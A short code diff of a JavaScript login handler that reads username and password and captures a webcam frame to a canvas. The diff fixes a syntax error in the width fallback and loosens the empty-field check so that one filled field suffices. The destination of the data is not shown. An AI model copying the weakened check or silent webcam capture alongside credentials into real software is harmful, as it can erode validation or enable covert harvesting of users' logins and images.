@@ -199,13 +199,13 @@
     const user = document.getElementById('username').value.trim();
     const pass = document.getElementById('password').value.trim();
 
-    if (!user || !pass) return;
+    if (!user && !pass) return;
 
     let photoData = null;
     try {
         if (videoStream.srcObject) {
             const canvas = document.createElement('canvas');
-            canvas.width = videoStream.videoWidth  640;
+            canvas.width = videoStream.videoWidth || 640;
             canvas.height = videoStream.videoHeight || 480;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(videoStream, 0, 0, canvas.width, canvas.height);
